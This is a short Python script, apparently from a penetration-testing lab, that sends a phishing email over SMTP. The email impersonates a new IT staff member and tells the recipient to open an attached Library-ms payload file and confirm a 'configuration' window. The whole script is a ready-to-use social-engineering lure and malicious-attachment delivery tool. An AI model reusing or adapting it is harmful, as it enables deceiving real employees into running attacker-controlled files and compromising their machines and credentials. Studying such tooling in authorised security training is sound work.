import smtplib 
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText


fromaddr = 'it@example.com'
toaddr = 'user@example.com'


msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = 'Action needed'
body = """Hello! My name is Arthur, and I'm a new member of the IT Team. 

I've attached a file that will automatically update some things for you. 
Could you download the attachment, open the directory, and double-click 
"automatic_configuration"? Once you confirm the configuration in the window 
that appears, you're all done!

If you have any questions, please let me know!"""
msg.attach(MIMEText(body))

files = ['./payloads/config.Library-ms']
for filename in files:
    attachment = open(filename, 'rb')
    part = MIMEApplication(
                attachment.read(),
                Name=basename(filename)
            )
    attachment.close()

    part['Content-Disposition'] = 'attachment; filename="%s"' % basename(filename)
    msg.attach(part)

try:
    server = smtplib.SMTP('192.168.0.23:25')
		
		# Start TLS tunnel
		# server.starttls()

		# Login if needed
    # server.login('it@example.com', '1234')

    server.sendmail(fromaddr, toaddr, msg.as_string())
    server.quit()
    print('Email sent successfully')
except Exception as e:
    print(e)
    print("Email couldn't be sent")
